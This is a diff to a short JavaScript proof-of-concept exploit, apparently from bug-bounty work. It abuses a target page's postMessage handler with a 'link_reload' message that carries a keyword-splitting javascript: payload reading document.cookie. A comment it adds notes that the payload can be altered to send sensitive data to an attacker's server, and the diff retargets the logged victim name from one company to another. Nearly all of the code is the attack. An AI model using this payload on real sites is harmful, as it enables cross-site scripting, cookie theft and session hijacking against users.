@@ -17,6 +17,7 @@ function openWin(){
 
 	function sendMessage(){
 		var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
+		//you can change the url payload for send back some sensitive information to the attacker's server
 		h1Win.postMessage(data,"*");
 		console.log("postmessage reload a new iframe's height and width")
 	}
@@ -24,7 +25,7 @@ function openWin(){
  
     // 接受server返回数据
     window.addEventListener('message', function(e) {
-        console.log('Get data from starbucks ---> ' + e.data);
+        console.log('Get data from oneplus ---> ' + e.data);
 	//clearInterval(s);
     }, false);
 document.getElementById("openH1").addEventListener('click', openWin);
